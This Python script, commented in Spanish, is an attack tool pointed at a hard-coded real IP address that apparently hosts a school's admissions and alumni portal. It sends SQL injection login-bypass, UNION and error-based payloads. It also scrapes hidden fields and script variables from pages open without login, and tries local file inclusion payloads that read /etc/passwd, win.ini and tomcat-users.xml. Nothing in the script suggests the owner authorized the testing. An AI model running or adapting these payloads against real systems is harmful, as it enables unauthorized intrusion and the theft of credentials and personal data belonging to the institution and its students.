import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedSitoExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def discover_login_url(self):
        """Descubre la URL correcta del formulario de login"""
        print("[*] Descubriendo URL correcta del login...")
        
        # Posibles URLs de login
        login_urls = [
            f"{self.base_url}/jsp/login.jsp",
            f"{self.base_url}/login.jsp",
            f"{self.base_url}/jsp/auth/login.jsp",
            f"{self.base_url}/login",
            f"{self.base_url}/auth/login",
            f"{self.base_url}/jsp/autenticacion/login.jsp",
            f"{self.base_url}/jsp/admin/login.jsp",
            f"{self.base_url}/jsp/usuario/login.jsp"
        ]
        
        for url in login_urls:
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    # Verificar si es un formulario de login
                    if 'xUsuario' in response.text and 'xContrasena' in response.text:
                        print(f"[!] ¡URL de login encontrada: {url}")
                        return url
                    else:
                        print(f"[+] URL accesible pero no es login: {url}")
            except Exception as e:
                print(f"[-] Error probando {url}: {e}")
        
        print("[-] No se encontró URL de login específica, usando página principal")
        return self.base_url

    def advanced_sql_injection(self):
        """SQL Injection avanzado con URL correcta"""
        print("\n[*] SQL Injection avanzado...")
        
        login_url = self.discover_login_url()
        print(f"[*] Usando URL: {login_url}")
        
        # Payloads más específicos
        sql_payloads = [
            # Bypass de login clásico
            {"xUsuario": "admin' OR '1'='1'--", "xContrasena": "any"},
            {"xUsuario": "' OR '1'='1'--", "xContrasena": "any"},
            {"xUsuario": "admin' OR 1=1--", "xContrasena": "any"},
            {"xUsuario": "' OR 1=1--", "xContrasena": "any"},
            
            # Union based
            {"xUsuario": "admin' UNION SELECT 1,2--", "xContrasena": "any"},
            {"xUsuario": "' UNION SELECT 1,2,3--", "xContrasena": "any"},
            
            # Comment based
            {"xUsuario": "admin'/*", "xContrasena": "any"},
            
            # Error based
            {"xUsuario": "admin' AND 1=CAST((SELECT version()) AS INT)--", "xContrasena": "any"},
        ]
        
        for i, payload in enumerate(sql_payloads):
            try:
                # Construir datos completos del formulario
                login_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': payload['xUsuario'],
                    'xContrasena': payload['xContrasena']
                }
                
                print(f"[*] Probando payload {i+1}: {payload['xUsuario']}")
                
                # Enviar POST a la URL correcta
                response = self.session.post(login_url, data=login_data, timeout=10, allow_redirects=True)
                
                # Análisis detallado de la respuesta
                self.analyze_response(response, payload, login_url)
                
            except Exception as e:
                print(f"[-] Error con payload {i+1}: {e}")

    def analyze_response(self, response, payload, url):
        """Analiza la respuesta del servidor en detalle"""
        print(f"    Status: {response.status_code}, Tamaño: {len(response.text)}")
        
        # Verificar redirecciones
        if response.history:
            print(f"    Redireccionado desde: {response.history[0].status_code}")
            print(f"    URL final: {response.url}")
        
        # Buscar indicadores específicos
        indicators = {
            'éxito': ['Bienvenido', 'Welcome', 'Dashboard', 'Menú', 'Cerrar Sesión', 'logout'],
            'error': ['Error', 'Invalid', 'Incorrecto', 'No existe', 'Denegado'],
            'database': ['SQL', 'Oracle', 'MySQL', 'PostgreSQL', 'Syntax'],
            'redirect': ['location.href', 'window.location', 'redirect:']
        }
        
        for category, terms in indicators.items():
            for term in terms:
                if term.lower() in response.text.lower():
                    print(f"    [!] Encontrado '{term}' - Posible {category}")
        
        # Guardar respuestas interesantes
        if response.status_code != 404 or 'error' not in response.text.lower():
            filename = f"response_{payload['xUsuario'][:10]}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"    [+] Respuesta guardada en {filename}")

    def exploit_accessible_jsp_pages(self):
        """Explota las páginas JSP accesibles sin login"""
        print("\n[*] Explotando páginas JSP accesibles...")
        
        accessible_pages = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z",
            "/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp",
            "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1",
            "/jsp/index.jsp"
        ]
        
        for page in accessible_pages:
            try:
                url = f"{self.base_url}{page}"
                print(f"\n[*] Analizando: {page}")
                
                response = self.session.get(url, timeout=8)
                
                # Buscar información sensible
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Formularios en la página
                forms = soup.find_all('form')
                if forms:
                    print(f"    [+] Formularios encontrados: {len(forms)}")
                
                # Inputs hidden
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    name = inp.get('name', '')
                    value = inp.get('value', '')
                    if name:
                        print(f"    Hidden: {name} = {value}")
                
                # Enlaces a otras páginas
                links = soup.find_all('a', href=True)
                interesting_links = [link['href'] for link in links if 'jsp' in link['href']]
                if interesting_links:
                    print(f"    Enlaces JSP: {interesting_links[:3]}")
                
                # Scripts con información
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string and 'var' in script.string:
                        lines = script.string.split('\n')
                        for line in lines[:5]:
                            if 'var' in line and ('user' in line.lower() or 'pass' in line.lower()):
                                print(f"    Script variable: {line.strip()}")
                
            except Exception as e:
                print(f"    [-] Error: {e}")

    def test_file_inclusion(self):
        """Prueba Local File Inclusion en parámetros"""
        print("\n[*] Probando Local File Inclusion...")
        
        lfi_payloads = [
            "../../../../../../etc/passwd",
            "../../../../../../windows/win.ini",
            "../../../../../../conf/tomcat-users.xml",
            "file:///etc/passwd",
            "http://localhost:8080/manager/html"
        ]
        
        test_urls = [
            f"{self.base_url}/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=",
            f"{self.base_url}/jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo="
        ]
        
        for base_url in test_urls:
            for payload in lfi_payloads:
                try:
                    test_url = f"{base_url}{payload}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if "root:" in response.text:
                        print(f"[!] ¡LFI VULNERABLE! {test_url}")
                    elif response.status_code == 200:
                        print(f"[+] Respuesta 200: {payload}")
                        
                except Exception as e:
                    pass

# Ejecutar
exploiter = AdvancedSitoExploiter("189.254.143.102")
exploiter.advanced_sql_injection()
exploiter.exploit_accessible_jsp_pages()
exploiter.test_file_inclusion()